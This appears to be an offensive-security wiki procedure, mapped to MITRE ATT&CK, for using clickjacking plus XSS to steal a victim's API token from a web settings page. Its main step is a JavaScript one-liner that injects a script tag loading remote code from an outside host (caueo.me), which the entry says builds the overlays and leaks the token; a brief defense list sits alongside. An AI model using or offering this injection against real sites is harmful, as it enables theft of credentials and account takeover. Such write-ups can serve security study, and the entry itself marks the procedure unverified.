---
tags:
  - clickjacking
  - credential-access
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/load-external-exploit-script]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:52:44.167Z'
sub_techniques: []
id: 88a6be4c-806f-4610-8a01-6706c01a061f
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Clickjacking-to-Steal-API-Token

## Summary

Overlay an invisible iframe on the settings page to trick the victim into clicking the 'Show' button for the API token, then leak the AJAX response.

## Description

No X-Frame-Options allows embedding; Referer checks permit iframe loads. Clickjacking overlays trigger the token fetch, updating DOM with the value for leakage.

## Requirements

1. XSS for iframe creation
2. Victim on settings page
3. External script for handling

## Defense

- Implement X-Frame-Options: DENY
- Add token display CSRF tokens
- Use out-of-band token delivery

## Objectives

1. Embed settings iframe
2. Simulate click on token button
3. Extract token from DOM

## Instructions

### Step 1: Load Exploit Script

**Context**: Inject script to handle clickjacking.

**Command** ([[commands/load-external-exploit-script]]):
```javascript
let x = document.createElement('script'); x.src = "//caueo.me/fb3af68664e3a23c0a5e516b94e515cf76f58243af317e447699ab0922617e4f.js"; document.body.appendChild(x);
```

> Script creates overlays and leaks.

### Step 2: Trigger Click

**Context**: Victim interacts with overlay.

> Expected: AJAX call reveals token in HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/load-external-exploit-script]]

## Tools Used


## Tags

- [[clickjacking]]
- [[credential-access]]
